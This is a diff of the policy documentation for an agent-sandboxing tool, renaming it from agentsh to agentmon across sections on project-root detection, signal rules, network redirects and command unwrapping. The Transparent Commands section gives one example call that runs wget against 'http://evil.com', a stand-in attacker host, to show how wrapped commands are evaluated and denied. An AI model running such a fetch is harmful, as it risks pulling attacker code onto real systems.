@@ -1,6 +1,6 @@
 # Policies
 
-This guide covers policy configuration and management for agentsh.
+This guide covers policy configuration and management for agentmon.
 
 ## Policy Variables
 
@@ -25,7 +25,7 @@ On Windows, additional variables are available:
 
 ### How Project Root Detection Works
 
-When a session is created, agentsh walks up from the workspace directory looking for project markers. The detection follows this logic:
+When a session is created, agentmon walks up from the workspace directory looking for project markers. The detection follows this logic:
 
 1. **Language markers** (go.mod, package.json, Cargo.toml, pyproject.toml) set `PROJECT_ROOT`
 2. **.git directory** sets `GIT_ROOT` (and `PROJECT_ROOT` if no language marker found)
@@ -99,7 +99,7 @@ In your server configuration (`server-config.yaml`):
 
 ```yaml
 policies:
-  dir: "/etc/agentsh/policies"
+  dir: "/etc/agentmon/policies"
   default: "dev-safe"
 
   # Enable/disable automatic project root detection (default: true)
@@ -114,7 +114,7 @@ policies:
     - "pyproject.toml"
     - "setup.py"           # Add Python setup.py
     - "pom.xml"            # Add Maven projects
-    - ".agentsh-root"      # Custom marker file
+    - ".agentmon-root"      # Custom marker file
 ```
 
 ### Disabling Detection
@@ -128,10 +128,10 @@ policies:
 **Per-session** (CLI):
 ```bash
 # Disable detection, use workspace as PROJECT_ROOT
-agentsh exec --no-detect-root SESSION -- cmd
+agentmon exec --no-detect-root SESSION -- cmd
 
 # Explicit project root (skips detection)
-agentsh exec --project-root /path/to/project SESSION -- cmd
+agentmon exec --project-root /path/to/project SESSION -- cmd
 ```
 
 **Per-session** (API):
@@ -145,7 +145,7 @@ agentsh exec --project-root /path/to/project SESSION -- cmd
 
 ## Platform-Specific Policies
 
-agentsh provides separate policy files for Unix/macOS and Windows:
+agentmon provides separate policy files for Unix/macOS and Windows:
 
 | Policy | Unix/macOS | Windows |
 |--------|-----------|---------|
@@ -177,7 +177,7 @@ On macOS, file I/O enforcement uses the Endpoint Security Framework (ESF) instea
 
 ## Signal Rules
 
-Signal rules control how signals (kill, terminate, stop, etc.) can be sent between processes within an agentsh session. This provides protection against runaway processes, accidental signal delivery to critical services, and enables graceful shutdown patterns.
+Signal rules control how signals (kill, terminate, stop, etc.) can be sent between processes within an agentmon session. This provides protection against runaway processes, accidental signal delivery to critical services, and enables graceful shutdown patterns.
 
 ### Platform Support
 
@@ -217,8 +217,8 @@ Target types define which processes can receive signals:
 | `children` | Direct children of sender |
 | `descendants` | All descendants |
 | `siblings` | Processes with same parent |
-| `session` | Any process in agentsh session |
-| `parent` | The agentsh supervisor |
+| `session` | Any process in agentmon session |
+| `parent` | The agentmon supervisor |
 | `external` | PIDs outside session |
 | `system` | PID 1 and kernel threads |
 | `user` | Other processes owned by same user |
@@ -332,11 +332,11 @@ connect_redirect:
 
 ### How It Works
 
-1. **DNS Redirect**: When a process resolves a hostname matching a rule, agentsh intercepts the DNS response and returns the configured IP. A correlation map stores the hostname→IP mapping.
+1. **DNS Redirect**: When a process resolves a hostname matching a rule, agentmon intercepts the DNS response and returns the configured IP. A correlation map stores the hostname→IP mapping.
 
-2. **Connect Redirect**: When a process connects to an IP:port, agentsh checks the correlation map to find the original hostname, evaluates redirect rules, and transparently redirects the connection.
+2. **Connect Redirect**: When a process connects to an IP:port, agentmon checks the correlation map to find the original hostname, evaluates redirect rules, and transparently redirects the connection.
 
-3. **TLS Handling**: In `passthrough` mode, encrypted traffic flows unchanged. In `rewrite_sni` mode, agentsh modifies the SNI in the TLS ClientHello before forwarding.
+3. **TLS Handling**: In `passthrough` mode, encrypted traffic flows unchanged. In `rewrite_sni` mode, agentmon modifies the SNI in the TLS ClientHello before forwarding.
 
 ### Visibility Options
 
@@ -380,12 +380,12 @@ connect_redirect:
 
 ## Transparent Commands
 
-Transparent commands are wrapper/interpreter commands (like `env`, `sudo`, `nice`) that don't perform meaningful work themselves — they just launch another command. When execve interception is enabled, agentsh automatically "unwraps" these wrappers to find and evaluate the real payload command against policy.
+Transparent commands are wrapper/interpreter commands (like `env`, `sudo`, `nice`) that don't perform meaningful work themselves — they just launch another command. When execve interception is enabled, agentmon automatically "unwraps" these wrappers to find and evaluate the real payload command against policy.
 
 ### How It Works
 
 1. A process calls `execve("/usr/bin/env", ["env", "wget", "http://evil.com"])`
-2. agentsh recognizes `env` as a transparent command
+2. agentmon recognizes `env` as a transparent command
 3. It unwraps to find the payload: `wget`
 4. Both `env` (wrapper) and `wget` (payload) are evaluated against command rules
 5. The **most restrictive** decision wins — if either is denied, the execution is denied
@@ -505,7 +505,7 @@ Set `allow_direct: true` only as an escape hatch when a third-party SDK cannot b
 
 ### Approval gating
 
-Rules with `decision: approve` use the same approvals manager as other approve rules in agentsh. The target shown to the approver is the request path including the query string. See [`docs/approval-auth.md`](../approval-auth.md) for approval channel configuration and anti-self-approval protections.
+Rules with `decision: approve` use the same approvals manager as other approve rules in agentmon. The target shown to the approver is the request path including the query string. See [`docs/approval-auth.md`](../approval-auth.md) for approval channel configuration and anti-self-approval protections.
 
 ### Rule evaluation order
 
@@ -527,7 +527,7 @@ If the wrong directory is detected as PROJECT_ROOT:
 
 1. Check which marker files exist in parent directories
 2. Use `--project-root` to override detection
-3. Add a custom marker file (e.g., `.agentsh-root`) and configure `project_markers`
+3. Add a custom marker file (e.g., `.agentmon-root`) and configure `project_markers`
 
 ### Checking Detected Values
 
